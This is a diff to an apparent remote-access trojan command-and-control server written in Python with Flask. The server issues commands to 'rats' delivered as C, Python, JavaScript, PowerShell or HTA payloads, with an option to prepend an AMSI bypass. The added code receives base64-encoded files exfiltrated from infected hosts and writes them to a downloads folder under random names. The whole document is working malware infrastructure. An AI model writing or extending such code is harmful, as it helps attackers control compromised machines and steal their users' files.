@@ -1,12 +1,15 @@
 #!/usr/bin/env python3
+
 from flask import Flask, request
 from datetime import datetime
 from itertools import cycle
 from pathlib import Path
+
 import threading
 import argparse
 import readline
 import logging
+import random
 import base64
 import time
 import json
@@ -28,6 +31,7 @@ ssl = args.ssl
 
 supported_types = ["c", "py", "js", "ps1", "hta"]
 msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
+alpha = "abcdefghijklmnopqrstuvwxyz"
 
 # Only applies to hta and js rats
 prepend_amsi_bypass_to_psh = True
@@ -266,6 +270,13 @@ def serve_server(port=8080):
             commands[ratID] = ""
             print("\n[*] Results from rat " + colors(str(post_dict['id'])) + ":\n")
             print(base64.b64decode(post_dict['retval']).decode('utf-8'))
+
+        if("dl" in post_dict.keys()):
+            commands[ratID] = "" # Reset command back to "" (blank) after we finish processing the results
+            rand = ''.join(random.choice(alpha) for choice in range(10)) 
+            with open(Path("downloads/" + ratID + "." + rand).resolve() , "wb") as fd:
+                fd.write(base64.b64decode(post_dict['dl']))
+            print("\n[*] File download from rat " + colors(ratID) + " saved to downloads/" + colors(ratID) + "." + rand)
 
         return(htmlify(json.dumps({"cmnd": commands[ratID]})))
 
